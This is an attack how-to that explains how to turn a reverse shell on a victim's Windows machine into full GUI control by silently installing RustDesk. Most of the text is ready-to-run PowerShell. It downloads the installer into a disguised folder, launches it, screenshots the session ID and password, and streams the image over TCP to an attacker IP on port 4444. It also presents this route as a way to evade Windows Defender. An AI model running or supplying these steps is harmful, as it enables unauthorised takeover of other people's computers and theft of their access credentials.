# RustDesk Remote Access via Reverse Shell

A way to get GUI access to someone's desktop through a reverse shell is to use RustDesk.

This is just a remote desktop software, but you need a randomly generated and encrypted key to actually connect from the attacker machine. A screenshot is taken which includes the target ID and password, which lets you gain full access to their desktop.

This can also be used with Metasploit payloads, but those get detected by Windows Defender immediately.

## Download RustDesk in PowerShell
```powershell
Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.exe" -OutFile "C:\Windows~\rustdesk.exe"
```

## Open RustDesk in PowerShell
```powershell
Start-Process "C:\Windows~\rustdesk.exe"
```

## Focus RustDesk/Bring it into view
```powershell
$wshell = New-Object -ComObject WScript.Shell
$wshell.AppActivate("RustDesk")
```

## Take screenshot as screenshot.png in Windows~
```powershell
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("C:\Windows~\screenshot.png")
$graphics.Dispose()
$bitmap.Dispose()
```

## Send screenshot.png to attacker machine
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows~\screenshot.png")
$client = New-Object System.Net.Sockets.TcpClient("Your IP", 4444)
$stream = $client.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```

## Connect from attacker machine

Once you have the target machine's RustDesk ID and password (which are in the screenshot), you can connect using RustDesk on the attacker machine.